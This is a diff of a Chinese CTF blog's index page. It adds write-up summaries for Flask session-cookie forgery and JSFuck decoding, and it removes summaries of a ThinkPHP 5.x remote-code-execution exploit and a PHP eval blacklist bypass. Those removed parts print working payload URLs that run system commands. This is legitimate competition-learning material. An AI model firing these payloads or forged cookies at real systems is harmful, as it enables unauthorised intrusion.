@@ -131,6 +131,103 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/19/LitCTF2023-flagclick-wp/" >LitCTF2023-flagclick-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-19
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3872">题目链接</a>  </p>
+<p>题目提示：<code>大型Flag赠送活动开始啦，不过只有管理员才能拿到</code></p>
+<p>进入页面，发现</p>
+<ul>
+<li><code>/hello</code> 	post name&#x3D;xxx		（直接发admin不行，尝试其他字符串都是直接不变输出）</li>
+<li><code>/flag</code>（拿flag按键跳转）       获取flag（仅admin可以）</li>
+</ul>
+<p>发现上传name后有个session值，类似base64</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/19/LitCTF2023-flagclick-wp/0x1.png?raw=true" alt="m"></p>
+<p>解码后得到</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;dàt@¸WÞ$ÊaÞ%mËv6ÙpD	<span class="comment"># 前半部分是上传的name，后面应该是数据签名</span></span><br></pre></td></tr></table></figure>
+
+<p>推测可能是 <strong>flask session伪造</strong></p>
+<p>再查看页面信息确实是flask</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/19/LitCTF2023-flagclick-wp/0x2.png?raw=true" alt="m"></p>
+<h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2><p>工具 <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>使用方法</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 flask-session-cookie-manager2.py decode -c <span class="string">&quot;session值&quot;</span> (-s <span class="string">&quot;key值&quot;</span>)</span><br><span class="line">python2 flask-session-cookie-manager2.py encode -s <span class="string">&quot;key值&quot;</span> -t <span class="string">&quot;我们需要伪造的值&quot;</span></span><br><span class="line">python3 flask-session-cookie-manager3.py decode -c <span class="string">&quot;session值&quot;</span> (-s <span class="string">&quot;key值&quot;</span>)</span><br><span class="line">python3 flask-session-cookie-manager3.py encode -s <span class="string">&quot;key值&quot;</span> -t <span class="string">&quot;我们需要伪造的值&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>伪造需要key，猜测为”LitCTF”</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask-session-cookie-manager3.py encode -s <span class="string">&#x27;LitCTF&#x27;</span> -t <span class="string">&#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># eyJuYW1lIjoiYWRtaW4ifQ.ZOBwTg.fCkX986VBbFDKMaipQ5QjHJAkQg</span></span><br></pre></td></tr></table></figure>
+
+<p>此时再访问<code>/flag</code>，将当前页面cookie改为伪造的值，刷新页面即可看到flag</p>
+
+	
+	</div>
+  <a type="button" href="/2023/08/19/LitCTF2023-flagclick-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/08/19/LitCTF2023-1zjs-wp/" >LitCTF2023-1zjs-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-19
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3871">题目链接</a>   </p>
+<p>题目提示：<code>js....?不确定，再看看。</code></p>
+<p>打开页面<code>F12</code>查看js源码</p>
+<p>搜索<code>flag</code>没发现什么有用信息；搜索<code>php</code>发现<code>index.umd.js</code>中有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your gift just take it : /f@k3f1ag.php</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>f@k3f1ag.php</code>，得到页面内容：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(+[![]]+[])[+[]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>为<strong>JSFuck</strong>加密后的内容</p>
+<blockquote>
+<p>JSFuck是基于JavaScript原子部分的深奥和教育性编程风格。它仅仅使用六个不同的字符来编写和执行代码，分别是：<code>&#123;</code> <code>&#125;</code> <code>[</code> <code>]</code> <code>+</code> <code>!</code><br>它不依赖于浏览器，因此可以在<strong>Node.js</strong>上运行。</p>
+</blockquote>
+<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>浏览器控制台中直接执行以上内容，即可得到flag</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/19/LitCTF2023-1zjs-wp/0x1.png?raw=true" alt="img"></p>
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>在线解密网站解密</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/jsfuck.html">http://www.hiencode.com/jsfuck.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></p>
+</blockquote>
+
+	
+	</div>
+  <a type="button" href="/2023/08/19/LitCTF2023-1zjs-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/08/18/afl-dyninst/" >AFL-Dyninst 安装及使用</a>
 								</h3>
 							</div>
@@ -625,85 +722,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/27/SWPUCTF2022-ezrce-wp/" >SWPUCTF2022-ezrce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-27
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2826">题目链接</a>  </p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>页面打开为空</p>
-<p>访问<code>robots.txt</code> 有</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">  -  /NSS/index.php/</span><br></pre></td></tr></table></figure>
-
-<p>访问<code>/NSS/index.php/</code> ，页面显示</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:)</span><br><span class="line"></span><br><span class="line">ThinkPHP V5</span><br><span class="line">十年磨一剑 - 为API开发设计的高性能框架</span><br><span class="line">[ V5.<span class="number">0</span> 版本由 七牛云 独家赞助发布 ]</span><br><span class="line"></span><br><span class="line">好熟悉的界面 似曾相识啊</span><br></pre></td></tr></table></figure>
-
-<p>可见系统使用<code>ThinkPHP v5.0</code></p>
-<h3 id="查询已知漏洞及攻击方式"><a href="#查询已知漏洞及攻击方式" class="headerlink" title="查询已知漏洞及攻击方式"></a>查询已知漏洞及攻击方式</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit thinkphp</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br><span class="line">ThinkPHP - Multiple PHP Injection RCEs (Metasploit)           | linux/remote/48333.rb</span><br><span class="line">ThinkPHP 2.0 - <span class="string">&#x27;index.php&#x27;</span> Cross-Site Scripting               | php/webapps/33933.txt</span><br><span class="line">ThinkPHP 5.0.23/5.1.31 - Remote Code Execution                | php/webapps/45978.txt		<span class="comment"># 选择这个</span></span><br><span class="line">ThinkPHP 5.X - Remote Command Execution                       | php/webapps/46150.txt</span><br><span class="line">-------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit -p 45978.txt		<span class="comment"># -p 上面Path中的文件名</span></span><br><span class="line"></span><br><span class="line">Exploit: ThinkPHP 5.0.23/5.1.31 - Remote Code Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/45978</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/45978.txt</span><br><span class="line">    Codes: N/A</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: ASCII text</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/45978.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: ThinkPHP 5.x &lt; v5.0.23,v5.1.31 Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2018-12-11</span></span><br><span class="line"><span class="comment"># Exploit Author: VulnSpy</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://thinkphp.cn</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/top-think/framework/</span></span><br><span class="line"><span class="comment"># Version: v5.x below v5.0.23,v5.1.31</span></span><br><span class="line"><span class="comment"># CVE: N/A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">http://server/public/index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20<span class="string">&#x27;phpinfo();&#x27;</span>		<span class="comment"># 明显第二个参数即为执行的命令</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?s=/index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">ls</span> /</span></span><br><span class="line"><span class="function">?<span class="title">s</span>=/<span class="title">index</span>/\<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">cat</span> $(<span class="params">find / -name flag</span>)</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/27/SWPUCTF2022-ezrce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/26/UUCTF2022-ez-rce-wp/" >UUCTF2022-ez_rce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-26
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3090">题目链接</a>   </p>
-<p>页面内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">居然都不输入参数，可恶!!!!!!!!!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>绕过检测即可执行命令</p>
-<p><code>printf</code>和<code>var_dump</code>没有被过滤	其他命令可以用<code>\</code>或中间插入<code>&#39;&#39;</code>绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">printf</span>(`l\s`);</span><br><span class="line">?code=<span class="title function_ invoke__">printf</span>(`l\s;c<span class="string">&#x27;&#x27;</span>at /fffffffffflagafag`)</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/26/UUCTF2022-ez-rce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -753,7 +771,7 @@
 		
 			<li><a href="/categories/CVE/">CVE<span>4</span></a></li>
 		
-			<li><a href="/categories/fuzz/">fuzz<span>1</span></a></li>
+			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
 		
@@ -765,7 +783,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>2</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>25</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>27</span></a></li>
 		
 		</ul>
 	</div>
@@ -776,48 +794,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
 		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>7</span></a></li>
-		
-			<li><a href="/tags/bypass/">bypass<span>1</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>11</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>3</span></a></li>
-		
-			<li><a href="/tags/web/">web<span>27</span></a></li>
-		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
-		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
-		
-			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
 		
 			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
 		
-			<li><a href="/tags/unserialise/">unserialise<span>2</span></a></li>
+			<li><a href="/tags/session/">session<span>1</span></a></li>
+		
+			<li><a href="/tags/heap-overflow/">heap_overflow<span>1</span></a></li>
 		
 			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>1</span></a></li>
 		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
+			<li><a href="/tags/rce/">rce<span>5</span></a></li>
 		
 			<li><a href="/tags/include/">include<span>1</span></a></li>
 		
-			<li><a href="/tags/off-by-one/">off_by_one<span>1</span></a></li>
+			<li><a href="/tags/php/">php<span>13</span></a></li>
 		
-			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>5</span></a></li>
+			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
 		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+			<li><a href="/tags/file-include/">file_include<span>2</span></a></li>
 		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>49</span></a></li>
+		
+			<li><a href="/tags/LitCTF2023/">LitCTF2023<span>2</span></a></li>
+		
+			<li><a href="/tags/ret2libc/">ret2libc<span>1</span></a></li>
+		
+			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
+		
+			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+		
+			<li><a href="/tags/unserialise/">unserialise<span>2</span></a></li>
+		
+			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
+		
+			<li><a href="/tags/canary/">canary<span>3</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>2</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>52</span></a></li>
+		   <li><a href="/tags">...<span>58</span></a></li>
 		 
 		</ul>
 	</div>
@@ -830,6 +848,14 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/08/19/LitCTF2023-flagclick-wp/" ><i class="fa fa-file-o"></i>LitCTF2023-flagclick-wp</a>
+      </li>
+    
+      <li>
+        <a href="/2023/08/19/LitCTF2023-1zjs-wp/" ><i class="fa fa-file-o"></i>LitCTF2023-1zjs-wp</a>
+      </li>
+    
+      <li>
         <a href="/2023/08/18/afl-dyninst/" ><i class="fa fa-file-o"></i>AFL-Dyninst 安装及使用</a>
       </li>
     
@@ -839,14 +865,6 @@
     
       <li>
         <a href="/2023/08/16/HCTF2016-兵者多诡-wp/" ><i class="fa fa-file-o"></i>HCTF2016-兵者多诡-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/08/15/dcquals16-feedme/" ><i class="fa fa-file-o"></i>nightmare 2.11.defcon quals...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/08/14/BKP2016-simplecalc-wp/" ><i class="fa fa-file-o"></i>nightmare 2.9.Boston Key Pa...</a>
       </li>
     
   </ul>
